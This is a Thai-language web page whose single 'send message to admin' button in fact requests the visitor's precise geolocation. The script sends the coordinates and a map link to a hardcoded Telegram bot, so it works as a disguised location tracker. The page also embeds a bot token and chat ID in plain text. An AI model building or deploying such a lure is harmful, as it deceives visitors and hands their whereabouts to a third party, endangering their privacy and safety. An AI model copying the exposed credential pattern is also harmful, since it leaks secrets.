<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ส่งข้อความไปยัง Telegram Bot</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #eaf2f8;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            text-align: center;
            background: #fff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.1);
        }

        h1 {
            color: #333;
            margin-bottom: 25px;
        }

        button {
            background-color: #28a745;
            color: white;
            padding: 12px 25px;
            font-size: 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ส่งข้อความไปยัง Telegram Bot</h1>
        <button onclick="getLocationAndSend()">ส่งข้อความหาแอดมิน</button>
    </div>

    <script>
        const botToken = '7586163097:AAFW-1cPYSRPGOdq9zJr0kOJh--gknZjyUU';  // ใส่ Bot Token ของคุณ
        const chatId = '5492311099';  // ใส่ Chat ID ของคุณ

        function getLocationAndSend() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    const message = `ตำแหน่งของผู้ใช้:\n- Latitude: ${latitude}\n- Longitude: ${longitude}\n\nลิงก์แสดงตำแหน่งบน Google Maps: https://maps.google.com/?q=${latitude},${longitude}`;

                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                    const data = {
                        chat_id: chatId,
                        text: message
                    };

                    fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            alert('ข้อความถูกส่งไปยัง Telegram Bot เรียบร้อย!');
                        } else {
                            alert('เกิดข้อผิดพลาดในการส่งข้อมูล');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('เกิดข้อผิดพลาดในการส่งข้อมูล');
                    });
                }, function(error) {
                    alert('ไม่สามารถเข้าถึงตำแหน่งได้!');
                    console.error(error);
                });
            } else {
                alert("เบราว์เซอร์ของคุณไม่รองรับ Geolocation API");
            }
        }
    </script>
</body>
</html>
